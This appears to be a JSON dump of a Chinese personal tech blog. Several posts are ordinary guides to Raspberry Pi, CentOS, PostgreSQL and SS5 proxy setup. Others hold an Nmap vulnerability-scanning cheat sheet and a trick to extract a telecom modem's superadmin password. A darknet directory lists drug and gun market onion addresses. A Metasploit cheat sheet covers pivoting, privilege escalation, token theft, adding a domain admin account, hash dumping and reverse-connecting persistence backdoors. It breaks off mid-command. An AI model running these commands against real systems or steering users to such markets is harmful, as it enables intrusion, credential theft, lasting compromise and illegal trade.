nmap -sn 192.168.1.1/24\n   Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-12 16:57 CST\n   Nmap scan report for 192.168.1.1\n   Host is up (0.0045s latency).\n   MAC Address: 我是马赛克 (Sichuan Tianyi Comheart Telecomco.)\n   Nmap scan report for 192.168.1.2\n   Host is up (0.021s latency).\n   MAC Address: 我是马赛克 (Apple)\n   Nmap scan report for 192.168.1.4\n   Host is up (0.027s latency).\n   MAC Address: 我是马赛克 (Ampak Technology)\n   Nmap scan report for 192.168.1.6\n   Host is up (0.0062s latency).\n   MAC Address: 我是马赛克 (Raspberry Pi Foundation)\n   Nmap scan report for 192.168.1.11\n   Host is up (0.0067s latency).\n   MAC Address: 我是马赛克 (Huawei Technologies)\n   Nmap scan report for 192.168.1.5\n   Host is up.\n   Nmap done: 256 IP addresses (6 hosts up) scanned in 4.58 seconds\n   lfoder in ~ λ\n   ```\n\n   可以看到 `Raspberry Pi Foundation` ，得知树莓派的IP是 `192.168.1.6`，然后`ssh pi@192.168.1.6`登陆之( 默认pi账户的密码是raspberry )，成功从U盘启动树莓派官方系统。\n\n\n\n#### 树莓派开机自动连接WiFi\n\n将你的wifi 通过以下格式 改写成一个 名为 `wpa_supplicant.conf` 存放在树莓派系统所在内存卡的根目录下 (unix系统看到的是在挂载的内存卡磁盘上的 /boot 目录下)，\n\n内容如下：\n\n```\ncountry=CN\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\n \nnetwork={\nssid=\"我是wifi名字\"\npsk=\"woshiwifimima\"\nkey_mgmt=WPA-PSK\npriority=1\n}\n\nnetwork={\nssid=\"WiFi-A\"\npsk=\"12345678\"\nkey_mgmt=WPA-PSK\npriority=2\nscan_ssid=1\n}\n\nnetwork={\nssid=\"WiFi-B\"\npsk=\"12345678\"\nkey_mgmt=WPA-PSK\npriority=3\nscan_ssid=1\n}\n```\n\nnetwork 里面的ssid是wifi的名字，psk 是wifi密码，填好后保存重启 ，树莓派将会根据优先级自动连上wifi。\n\n\n\n### 低电压错误处理\n\n> 至此 ，树莓派接上HDMI线后连接电视会出现以下错误提示信息\n\n```\nUnder-voltage detected! (0x00050005)\n```\n\n期间右上角还会出现黄色的小闪电，偶尔会开机黑屏，系统都进不去...  这是电压检测不通过。\n\n状况概览：\n\n![](https://ws1.sinaimg.cn/large/006tKfTcgy1fr8njfc9jkj31kw16o0wy.jpg)\n\n然后黑屏，至少我的状况是这样的..  \n\n> 解决方法：\n\n编辑 内存卡根目录 (unix系统打开是在挂载磁盘的 /boot 目录下) 找到 `config.txt`\n\nvim编辑此文件，追加以下信息到结尾：\n\n```\n# Disable under-voltage warning\navoid_warnings=1\n```\n\n保存退出 ，重启树莓派，错误提示消失并成功开机。\n\n> 参考资料:\n\nhttps://scribles.net/lightning-bolt-under-voltage-warning-on-raspberry-pi\n\nhttps://retropie.org.uk/forum/topic/1006/under-voltage-on-the-pi3\n\nhttps://github.com/raspberrypi/linux/issues/2512\n\n这里还有一篇关于树莓派电压不足的文章，推荐使用 5V 2A 的电源。\n\nhttp://bbs.elecfans.com/jishu_450017_1_1.html","tags":["Raspberry Pi"],"categories":["Raspberry Pi 笔记"]},{"title":"树莓派下使用dd克隆系统","url":"%2F2018%2F05%2F06%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8B%E4%BD%BF%E7%94%A8dd%E5%85%8B%E9%9A%86%E7%B3%BB%E7%BB%9F%2F","content":"\n### 情况了解\n\n> 硬件清单：\n\n- Raspberry Pi 3B\n- 64GB 内存卡\n- 8G U盘\n- 没有读卡器 没有读卡器 没有读卡器\n\n> 状况简述：\n\n事件一 ( 树莓派从U盘启动系统 ) ： \n\n入手了一个  **树莓派3B** ，很久之前 用 读卡器和一张 64GB的闲置内存卡 装了个 `kali arm 2.0` ，通过树莓派启动运行着做一个小型的渗透系统使用，但是最近系统最近被自己玩坏了，各种疑难杂症，解决方法千奇百怪，于是乎想换成 树莓派官方的专用的树莓派系统，清净一会，折腾折腾硬件。但是忽然想起来一个问题，我的读卡器出去旅行了，还没有回来，性格暴躁的我怎么可能再去淘宝上买一个新的然后等几天才收到然后重新烧写系统，虽然这样操作简单，但是我不愿意等，生命在于折腾，翻箱倒柜找到一个8G的老U盘，读写速度一般，Google了一下有没有什么办法让树莓派通过U盘启动，把官方原版系统刷到U盘上去 ，这样直接插上U盘，改点东西就能通过U盘启动了，这个东西就是**引导文件**，尝试修改引导通过U盘启动烧写在U盘上的树莓派官方原版系统。\n\n\n\n事件二 ( 衍生... U盘系统已经成功启动，尝试树莓派上克隆整个系统 )：\n\n正在运行中的U盘树莓派系统，使用 `dd` 命令来克隆U盘上的树莓派系统到原来的64G的内存卡上。从而抛弃8G的U盘，直接使用内存卡运行树莓派官方原版系统。\n\n### 具体实施\n\n- 修改树莓派引导文件 从U盘启动系统\n\n> 科普一下，树莓派的BootLoader启动顺序，树莓派会优先从TF卡(你的内存卡)启动，其次从USB端口启动。具体可以参考 [这篇文章](http://www.52pi.net/archives/468) ，但是因为我当前的实际情况是 kali arm 系统，不适合通过这种方式启动，因为在根目录下没有 config.txt 文件，我只能尝试直接修改根目录下的 cmdline.txt 文件 （当然是修改64G的内存卡上的 cmdline.txt）\n\n1. 首先下载官方树莓派系统 烧写到U盘，过程自行百度。\n\n2. 在U盘根目录下创建一个名为 `ssh` 的空文件，插上做好的U盘到树莓派上。\n\n3. SSH连接到树莓派上的Kali系统，进入到 ` /boot` 目录，找到 `cmdline.txt` 文件，修改文件中的 `root=/dev/mmcblk0p2`  为 `root=/dev/sda2`  \n\n   因为U盘系统做好了以后，U盘上默认有2个分区，第一个分区 为 boot引导分区 ，第二个分区为数据分区。而对于树莓派来说 ，有3个分区 ，第一个是 64G的内存卡系统，第二个是U盘的boot分区，第三个是U盘的data分区，linux下磁盘分区默认从sda后面加数字递增，所以 第一个第二个第三个分别是 sda，sda1，sda2 ，所以引导启动指定为 /dev/sda2\n\n4. 修改好后，直接保存 ，插上网线，然后重启\n\n5. 用自己的电脑执行 `sudo nmap -sn 192.168.1.1/24 ` ，扫描树莓派所在的网段，我是在MacOS下执行的，得加sudo，执行结果如下：\n\n   ```\n   lfoder in ~ λ sudo nmap -sn 192.168.1.1/24\n   Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-06 20:47 CST\n   Nmap scan report for 192.168.1.1\n   Host is up (0.0045s latency).\n   MAC Address: 我是马赛克 (Sichuan Tianyi Comheart Telecomco.)\n   Nmap scan report for 192.168.1.2\n   Host is up (0.021s latency).\n   MAC Address: 我是马赛克 (Apple)\n   Nmap scan report for 192.168.1.4\n   Host is up (0.027s latency).\n   MAC Address: 我是马赛克 (Ampak Technology)\n   Nmap scan report for 192.168.1.6\n   Host is up (0.0062s latency).\n   MAC Address: 我是马赛克 (Raspberry Pi Foundation)\n   Nmap scan report for 192.168.1.11\n   Host is up (0.0067s latency).\n   MAC Address: 我是马赛克 (Huawei Technologies)\n   Nmap scan report for 192.168.1.5\n   Host is up.\n   Nmap done: 256 IP addresses (6 hosts up) scanned in 4.58 seconds\n   lfoder in ~ λ\n   ```\n\n   可以看到 `Raspberry Pi Foundation` ，得知树莓派的IP是 `192.168.1.6`，然后`ssh pi@192.168.1.6`登陆之( 默认pi账户的密码是raspberry )，成功从U盘启动树莓派官方系统。\n\n- U盘树莓派系统通过dd命令克隆到内存卡\n\n  \n\n  > PS: 我失败了............     >…< il  ","tags":["系统克隆"],"categories":["Raspberry Pi 笔记"]},{"title":"MacOS安装配置与使用lrzsz文件传输工具","url":"%2F2018%2F04%2F27%2FMacOS%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8lrzsz%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7%2F","content":"\n\n\n## 前言\n\nrz 可以很方便的从客户端传文件到服务器，sz也可以很方便的从服务器传文件到客户端，就算中间隔着跳板机也不影响。在mac下试了一下，mac的终端是不支持的，需要下载item2。另外不能在mac下用expect 自动登录服务器、执行rz或sz等操作，否则终端会挂掉。\n\n## 安装与配置\n\n### 安装iTerm2\n\n官方下载地址:\n\nhttp://iterm2.com/downloads.html\n\n下载完成后，解压得到 iTerm2.app 拖放到 自己应用程序(Applocation) 中即可。\n\n### 安装lrszs\n\n```\nbrew install lrzsz\n```\n\n检查是否安装成功\n\n```\nls -lah /usr/local/bin/sz\nls -lah /usr/local/bin/rz\n```\n\n### 下载iTerm2-zmodem\n\n```\nsudo wget https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-send-zmodem.sh -O /usr/local/bin/iterm2-send-zmodem.sh\n\nsudo wget https://raw.github.com/mmastrac/iterm2-zmodem/master/iterm2-recv-zmodem.sh -O /usr/local/bin/iterm2-recv-zmodem.sh\n\nsudo chmod 777 /usr/local/bin/iterm2-*\n```\n\n### 配置iTerm2 添加触发Trigger\n\n给终端iTerm2 添加触发Trigger 事件\n\n打开iTerm2  ==> 按下 组合件 `command` + `,`   ==> 找到 `Triggers` 下面的`Edit` 点击 ==> 弹出一个窗口\n\n内容写如下配置:\n\n| Reguler Expression | Action | Parameters | Instant |\n| :----------------: | :----: | :--------: | :-----: |\n|    \\\\\\*\\\\\\*B0100    | Run Slient Coprocess... | /usr/local/bin/iterm2-send-zmodem.sh | ✔ |\n| \\\\\\*\\\\\\*B00000000000000 | Run Slient Coprocess... | /usr/local/bin/iterm2-recv-zmodem.sh | ✔ |\n\n配置完成，现在你可以使用MacOS下的iTerm2终端操作lrzsz 来传输文件了。\n\n\n\n## 使用\n\n### 从本地传输文件到远程\n\n在MacOS刚配置好的iTerm2终端下使用ssh远程登录到一台你的VPS或虚拟机上，在ssh中输入 `rz` 命令，会弹出一个选择文件的窗口，选择确定后会直接传入到远程SSH的机器上。\n\n### 从远程传输文件到本地\n\n在MacOS刚配置好的iTerm2终端下使用ssh远程登录到一台你的VPS或虚拟机上，在ssh中输入 `sz` 命令加你要传回来的文件路径 (例如 : `sz /root/lfoder.txt`)，会弹出一个文件保存的窗口，选择位置后直接确定，即开始从远程将文件传输至本地。\n\n","tags":["linux文件传输"],"categories":["MacOS 笔记"]},{"title":"CentOS安装图形化操作界面","url":"%2F2018%2F04%2F26%2FCentOS%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%93%8D%E4%BD%9C%E7%95%8C%E9%9D%A2%2F","content":"\n\n\n### 一、使用网络安装（如果网络比较快，这个方法简单）\n\n```bash\nyum groupinstall \"Desktop\"\nyum groupinstall \"X Window System\"\nyum groupinstall \"Chinese Support\"\nyum groupinstall \"Font\"\n\nstartx\n```\n\n\n\n### 二、使用光盘安装（本地安装，速度快，麻烦一点）\n\n见：<http://blog.163.com/tsee123@126/blog/static/3514054520118862320896/>\n\n1、首先进行光盘的挂载，注意光盘挂载时不会自动建立目录的，所以需要自己建立目录\n\n```\nmkdir /mnt/cdrom\nmount /dev/cdrom /mnt/cdrom       #dev目录为设备目录\n```\n\n2、更改本地源地址\n\n```\ncd /etc/yum.repos.d/         #可以看见CentOS-Base.repo和CentOS-Media.repo文件\n```\n\n注意：\nCentOS-Base.repo记录着网络上的yum源的地址和路径信息等\nCentOS-Media.repo记录着可以从本地作为yum源的介质和路径\n所以，我们更改CentOS-Media.repo就可以了\n\n```\nbaseurl=file:///media/CentOS/\n              file:///media/cdrom/\n              file:///media/cdrecorder/\n              file:///mnt/cdrom    #增加这句\n```\n\n3、我们安装gnome，但是在centos6里，gnome已经被改为Desktop了\n\n```bash\nyum --disablerepo=* --enablerepo=c6-media groupinstall \"Desktop\"\n```\n\n\\# 当然也可以看下有没有 groupinstall 改为 grouplist\n4、安装好了gnome，还需安装X Window\n\n```bash\nyum --disablerepo=* --enablerepo=c6-media groupinstall \"X Window System\"\n```\n\n5、然后我们安装中文语言\n\n```bash\nyum --disablerepo=* --enablerepo=c6-media groupinstall \"Chinese Support\"\n```\n\n6、最关键的一步了，启动gnome\n\n```bash\nstartx\n```\n\n","categories":["Linux 笔记"]},{"title":"Nmap扫描与发现漏洞全技巧","url":"%2F2018%2F04%2F12%2FNmap%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%8A%80%E5%B7%A7%2F","content":"\n\n\n### 漏洞主机发现\n\n#### 验证iis短文件名泄露\n\n```\nnmap -p 80 --script http-iis-short-name-brute 192.168.0.1/24\n```\n\n#### 验证Memcached未授权访问漏洞\n\n```\nnmap -sV -p 11211 -script memcached-info 192.168.0.1/24\n```\n\n#### 验证http.sys远程代码执行漏洞\n\n```\nnmap -sV  -script http-vuln-cve2015-1635 192.168.0.1/24\n```\n\n#### 验证心脏出血漏洞\n\n```\nnmap -sV --script=ssl-heartbleed 192.168.0.1/24\n```\n\n#### 验证Mongodb未授权访问漏洞\n\n```\nnmap -p 27017 --script mongodb-info 192.168.0.1/24\n```\n\n#### 验证Redis未授权访问漏洞\n\n```\nnmap -p 6379 --script redis-info 192.168.0.1/24\n```\n\n#### 验证Elasticsearch未授权访问漏洞\n\n```\nnmap --script=http-vuln-cve2015-1427 --script-args command='ls' 192.168.0.1/24\n```\n\n#### 验证Rsync未授权访问漏洞\n\n```\nnmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.0.1/24\n```\n\n\n\n> 相关资料：\n>\n> https://blog.csdn.net/jiangliuzheng/article/details/51992220\n>\n> https://blog.csdn.net/hackerie/article/details/78065636\n>\n> http://www.vuln.cn/2444\n\n","tags":["Nmap"],"categories":["Nmap 笔记"]},{"title":"DarkNet - 暗网导航Wiki  (持续更新)","url":"%2F2018%2F04%2F11%2FDarkNet%2F","content":"\n## DarkNet - 暗网导航Wiki  (持续更新)\n\n### Search Engine\n\n|       Site        |         Domain         |      Description      |\n| :---------------: | :--------------------: | :-------------------: |\n|  The Pirate Bay   | uj3wazyk5u4hnvtk.onion |       BT Search       |\n|     not Evil      | hss3uro2hsxfogfq.onion | DarkNet Search Engine |\n|  The Hidden Wiki  | zqktlwi4fecvo6ri.onion |  DarkNet  Navigation  |\n|    DuckDuckGO     | 3g2upl4pq6kufc4m.onion |                       |\n| Tor Search Engine | xmh57jrzrnw6insl.onion |                       |\n|   Fresh Onions    | zlal32teyptf4tvi.onion |  DarkNet  Navigation  |\n\n### Market\n\n|     Site     |                            Domain                            | Description |\n| :----------: | :----------------------------------------------------------: | :---------: |\n| UnderMarket  |                    un62d2ywi33bho53.onion                    |             |\n| DreamMarket  |                    4buzlb3uhrjby2sb.onion                    |             |\n|  Silk Road   |                    silkroad7rn2puhj.onion                    |             |\n| WallstMarket |                    wallstyizjhkrvmj.onion                    |             |\n|     $$$      |                    2jv5r7k66ralyk3g.onion                    |             |\n|  BlockChain  |                    blockchainbdgpzk.onion                    |             |\n| EmpireMarket | hsqluhqe6dlfl7jaxulf7cfun6xt274btvnqvaorliem5j6sqjiwhdyd.onion |             |\n| Market Guns  |                    f6pxr3iqw7iziuc2.onion                    |             |\n\n### Forum\n\n|      Site       |         Domain         | Description |\n| :-------------: | :--------------------: | :---------: |\n|      0day       | qzbkwswfv5k2oj5d.onion |             |\n| Silk Road Forum | satri4bb5r56y253.onion |             |\n|  暗网中文论坛   | deepbbs3x2owgof4.onion |             |\n\n### Community\n\n|   Site   |           Domain           | Description |\n| :------: | :------------------------: | :---------: |\n| facebook | www.facebookcorewwwi.onion |             |\n\n### Chat Room\n\n|    Site     |         Domain         | Description |\n| :---------: | :--------------------: | :---------: |\n| Global Chat | tc3uir3kky2tejzu.onion |  Chat Room  |\n|             |                        |             |\n|             |                        |             |\n|             |                        |             |\n|             |                        |             |\n\n","tags":["匿名浏览"],"categories":["洋葱网络"]},{"title":"Mounty挂载失败解决方法","url":"%2F2018%2F03%2F12%2FMounty%E6%8C%82%E8%BD%BD%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F","content":"\n**错误过程**：\n\n开机启动 `Mounty` 挂载NTFS磁盘时出现挂载失败的情况，磁盘在win下面没有安全删除就拔出来了，导致文件系统中有错误区块，所以在MAC中不能挂载成读写模式。\n\n![](https://ws4.sinaimg.cn/large/006tNbRwgy1fp9ungtfepj30ng08et8x.jpg)\n\n卷\"BOOTCAMP \"不可重新挂载\n\n\n\n**解决方案**：\n\n到 win 下 对不可挂载的NTFS磁盘，进行 `chkdsk /f` 操作 ，并在结束后安全移除磁盘","tags":["Mounty"]},{"title":"MacOS安装PostgreSQL","url":"%2F2018%2F03%2F09%2FMacOS%E5%AE%89%E8%A3%85PostgreSQL%2F","content":"\n\n\n### 测试环境\n\n- macOS Sierra `10.12.6`\n\n### 安装 PostgreSQL\n\n```\nbrew install postgresql\n```\n\n### 配置 PostgreSQL\n\n#### 查看版本\n\n```\n➜  ~ pg_ctl -V\npg_ctl (PostgreSQL) 10.3\n```\n\n安装成功之后，安装路径为：`/usr/local/var/postgres`\n\n#### 初始化数据库\n\n```\ninitdb /usr/local/var/postgres\n```\n\n#### 手动启动 PostgreSQL\n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start\n```\n\n#### 查看 PostgreSQL 运行状态\n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log status\n```\n\n#### 手动停止 PostgreSQL \n\n```\npg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log stop -s -m fast\n```\n\n#### 查看进程\n\n```\nps aux | grep postgres\n```\n\n#### 创建用户和数据库 （此处未测试）\n\n```\n#createuser will prompt you for a password, enter it twice.\n$ createuser -U postgres -P 123456\n$ createdb -O postgres -E utf8 test_db\n$ psql\npostgres=# GRANT ALL PRIVILEGES ON postgres TO postgres;\npostgres=# \\q\n```\n\n#### 进入命令行模式\n\n```\npsql -U test test_db -h localhost -W\n```\n\n#### 设置开机自启动\n\n```\nsudo ln -sfv /usr/local/opt/postgresql/*.plist ~/Library/LaunchAgents\nlaunchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist\n```\n\n\n\n\n\n### 错误解决\n\n#### FATAL: Ident authentication failed for user\n\n```\nThis is because by default PostgreSQL uses ‘ident’ authentication i.e it checks if the username exists on the system. You need to change authentication mode to ‘trust’ as we do not want to add a system user. Modify the settings in “pg_hba.conf” to use ‘trust’ authentication.\n```\n\n请修改 `/usr/local/var/postgres/pg_hba.conf` 为：\n\n安装 pgadmin，下载地址：<http://www.pgadmin.org/download/macosx.php>\n\n\n\nvia：https://yq.aliyun.com/articles/25638","tags":["Database"]},{"title":"Linux搭建Socks5服务端","url":"%2F2018%2F03%2F02%2FLinux%E6%90%AD%E5%BB%BASocks5%E6%9C%8D%E5%8A%A1%E7%AB%AF%2F","content":"\n### 测试环境\n\n- CentOS release 6.5   `64 bit`\n\n### 下载安装与编译\n\n> 安装依赖\n\n```bash\nyum -y install gcc gcc-c++ automake make pam-devel openldap-devel cyrus-sasl-devel openssl-devel\n```\n\n> 安装最新版，可以从这里获取最新版 ==> [官方网站](http://ss5.sourceforge.net/)\n\n目前我的最新版是 `3.8.9-8`  ，使用 wget 下载：\n\n```bash\nwget https://ncu.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz\n```\n\n解压编译\n\n```bash\ntar zxvf ./ss5-3.8.9-8.tar.gz\ncd ss5-3.8.9\n./configure\nmake\nmake install\n```\n\n### 配置与使用\n\n####设置开机启动\n\n```bssh\nchmod +x /etc/init.d/ss5\nchkconfig --add ss5\nchkconfig --level 345 ss5 on\n```\n\n#### 修改访问控制配置\n\n程序默认配置路径在 `/etc/opt/ss5`，修改配置来允许访问，编辑 `/etc/opt/ss5/ss5.conf`文件，找到如下位置：\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               -\n```\n\n上面的英文字段和下面的值一一对应，如果不需要认证，只用把auth前面的 `#` 号去掉即可。然后还需要修改一处：\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\n此处与上同理，去掉 permit 前面的`#` 号即可。\n\n#### 修改访问控制配置 (带权限认证)\n\n**这样配置的ss5是开放性的，任何能访问到你服务端口的人都能访问，如果你要设置账户授权访问，则可以限制使用者**\n\n具体设置授权访问的方法如下，同样在  `/etc/opt/ss5/ss5.conf` 文件中找到上面两处，\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               -\n```\n\n看到后面又一个 `Authentication` 字段，下面对应了一个 `-` ，这里将横杠改成 `u` 即可，修改后如下：\n\n```\n# ///////////////////////////////////////////////////////////////////////////////////\n#       SHost           SPort           Authentication\n#\nauth    0.0.0.0/0               -               u\n```\n\n然后还有第二处：\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\n同样 `Auth` 下面对应的横杠 `-` 改成 `u` ，修改后如下：\n\n```\n# /////////////////////////////////////////////////////////////////////////////////////////////////\n#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate\n#\npermit u        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -\n\n```\n\n这样就配置好了允许授权访问，然后你需要添加授权用户，此时操作 `/etc/opt/ss5/ss5.passwd`  文件，添加账户，一行一个，用空格隔开账号密码 `/etc/opt/ss5/ss5.conf` 内容如下：\n\n```\nadmin passw0rd123\nroot pa55w0Rdl23\n```\n\n这里添加了两个授权账户，可供连接ss5服务时授权认证。\n\n#### 修改默认端口\n\n**ss5默认开启的代理端口时1080，这是一个常用的代理端口，经常会被一些黑客使用扫描器快速捕获到，我们可以通过修改默认端口的方式来隐藏ss5代理服务**\n\n修改默认端口的方法如下，编辑 `vim /etc/sysconfig/ss5` 文件：\n\n```\n# Add startup option here\nSS5_OPTS=\" -u root -b 0.0.0.0:9999\"\n```\n\n去掉第二行前面的 `#` 井号主食 ，并将双引号中间的内容修改为上文中的配置，其中 `9999` 是修改后的代理端口，每次修改配置都需要重启ss5服务，使其生效。\n\n#### 启动、关闭 ss5 服务\n\n启动服务\n\n```\nservice ss5 start\n```\n\n关闭服务\n\n```\nservice ss5 stop\n```\n\n查看运行状态\n\n```\nservice ss5 status\n```\n\n重启服务\n\n```\nservice ss5 restart\n```\n\n#### 查看日志\n\n```bash\ntail -f /var/log/ss5/ss5.log\n```\n\n\n\n完。","tags":["隧道技术"],"categories":["Linux 笔记"]},{"title":"天翼光猫破解超级管理员账号密码","url":"%2F2018%2F03%2F02%2F%E5%A4%A9%E7%BF%BC%E5%85%89%E7%8C%AB%E7%A0%B4%E8%A7%A3%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%2F","content":"\n\n\n### 获取密码的步骤\n\n1. 首先去光猫底部看看，你会发现一个普通用户的账号和密码，登录之。\n\n   ​\n\n2. 假设你的光猫IP是 `192.168.1.1` 访问 http://192.168.1.1/backupsettings.conf 这个连接下载配置文件。\n\n3. 重命名配置文件  `backupsettings.conf`  为 `backupsettings.conf.txt`  。\n\n4. 找到类似这样的地方，就是账号和密码：\n\n   ```\n   <X_CT-COM_TeleComAccount>\n           <Password>telecomadmin88888888</Password>\n   </X_CT-COM_TeleComAccount>\n   ```\n\n   其中通用账号是：`telecomadmin`\n\n   密码则是：`telecomadmin88888888`\n\n","tags":["光猫"]},{"title":"MetaSploit内网渗透全技巧","url":"%2F2018%2F03%2F01%2FMetaSploit%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%85%A8%E6%8A%80%E5%B7%A7%2F","content":"\n## 技巧汇总\n\n\n\n### 内网代理\n\n方法一：\n\n```bash\nmeterpreter > run get_local_subnets //获取网段\nmeterpreter > run autoroute -s 172.2.175.0/24 //添加路由\nmeterpreter > run autoroute -p //查看路由\nmeterpreter > run autoroute -d -s 172.2.175.0 //删除网段\nmeterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。\nmeterpreter > background //后台sessions\n```\n\n方法二：\n\n```\nmeterpreter> run get_local_subnets #查看网段/子网 \nLocal subnet: 192.168.33.0/255.255.255.0 \nmeterpreter> background #转入后台运行 \nmsf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 \nmsf> route print #查看添加的信息 \nmsf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻 \nmsf> set payload linux/x86/shell/reverse_tcp \nmsf> set LHOST 10.10.1.129 #此处为attacking 主机的外网IP \nmsf> set LPORT 8080 \nmsf> set RHOST 192.168.33.132 #内网目标主机 \nmsf> exploit \n也可以使用自动式添加路由模块： \nmsf> load auto_add_route \nmsf> exploit\n```\n\n### 权限提升\n\n自动化提权：\n\n```\nmeterpreter > getsystem //直getsystem提权，最常用简单的办法\n```\n\n半自动提权：\n\n```\nmeterpreter > background //先后台运行会话\n[*] Backgrounding session 1…\nmsf > use post/windows/escalate/ms10_073_kbdlayout\nmsf > show options\nmsf > set session 1 //设置要使用的会话\nmsf post(ms10_073_kbdlayout) > exploit\n注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。\n或者直接：\nmeterpreter > run post/windows/escalate/ms10_073_kbdlayout\n```\n\n\n\n### 令牌窃取与模拟\n\n当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 \n\n- 窃取令牌\n\n```\nmeterpreter > use incognito //进入这个模块\nmeterpreter > list_tokens –u //查看存在的令牌\nmeterpreter > impersonate_token NT AUTXXXX\\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠\n\n注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。\n```\n\n- 令牌模拟\n\n  ```\n  meterpreter> ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 \n  meterpreter> steal_token 380 \n  有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 \n  用token： \n  meterpreter> use incognito \n  meterpreter> list_tokens –u #列出可用token，假如找到域控token \n  meterpreter> impersonate_token SNEAKS.IN\\ihazdomainadmin \n  meterpreter> add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 \n  meterpreter> add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组\n  ```\n\n  ​\n\n### BypassUAC\n\n```\nmsf > use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样\nmsf > show options\nmsf > set session 4\nmsf > run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权\n```\n\n\n\n### HashDump\n\n```\nmeterpreter > run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好\n```\n\n64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 `run post/windows/gather/hashdump` 来dump hash 成功率更高。 \n而且如果要使用shell 添加系统账户的话win7 下得先： \n\n```\nrun post/windows/escalate/bypassuac\n```\n\n不然可能不会成功\n\n### 权限维持\n\n- 服务启动后门\n\n  ```\n  meterpreter > run metsvc -A //再开起一个终端，进入msfconsole\n  msf > use exploit/multi/handler //新终端中监听\n  msf > set payload windows/metsvc_bind_tcp\n  msf > set LPORT 31337\n  msf > set RHOST 192.168.0.128\n  msf > run //获取到的会话是system权限\n  ```\n\n- 启动项启动后门\n\n  ```\n  meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105\n  ```\n  -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\` 中的注册表键和 `C:\\WINDOWS\\TEMP\\` 中的 VBScript 文件。\n  \n  下次连接时： \n\n   ```\n   msf> use multi/handler \n   set payload windows/meterpreter/reverse_tcp \n   set LPOST 443 \n   set LHOST 192.168.1.111 \n   exploit \n   ```\n  \n   会在以下位置和注册表以随机文件名写入文件等信息，如： \n  \n   ```\n   C:\\Users\\YourtUserName\\AppData\\Local\\Temp\\MXIxVNCy.vbs \n   C:\\Users\\YourtUserName\\AppData\\Local\\Temp\\radF871B.tmp\\svchost.exe \n   HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DjMzwzCDaoIcgNP) \n   ```\n\n  缺点：容易被杀毒软件杀 。\n> 弊端：这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程\n\n\n\n  \n\n### 漏洞扫描\n\n- 端口扫描\n\n  ```\n  use auxiliary/scanner/portscan/tcp\n  show options\n  set rhosts 192.168.2.1-255\n  set ports 21,22,25,443,445,1433,3306\n  set threads 20\n  exploit\n  ```\n\n- MSSQL开发利用\n\n  1. 对各个ip是否有mssql服务的探测\n\n     ```\n     use scanner/mssql/mssql_ping //测试MSSQL的存在和信息\n     show options\n     set rhosts 192.168.2.1-255\n     set threads 30\n     exploit\n     ```\n\n  2. 对扫描到的IP进行爆破\n\n     ```\n     msf> use auxiliary/scanner/mssql/mssql_login \n     show options \n     set PASS_FILE 